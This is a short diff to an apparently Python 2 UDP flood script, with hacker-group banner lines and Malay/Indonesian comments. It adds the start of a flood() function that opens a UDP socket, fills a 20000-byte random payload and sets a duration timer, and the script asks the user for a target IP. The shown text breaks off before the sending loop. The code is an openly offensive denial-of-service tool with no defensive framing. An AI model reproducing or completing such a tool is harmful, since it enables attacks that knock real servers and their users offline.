@@ -34,7 +34,14 @@ def usage():
     print "                       #WE ARE MALAYSIAN HACKER"
     print "                       #WE ARE MUSLIM HACKER"
     print
-
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
 
 
 ip = raw_input("Masukkan IP Target : ")
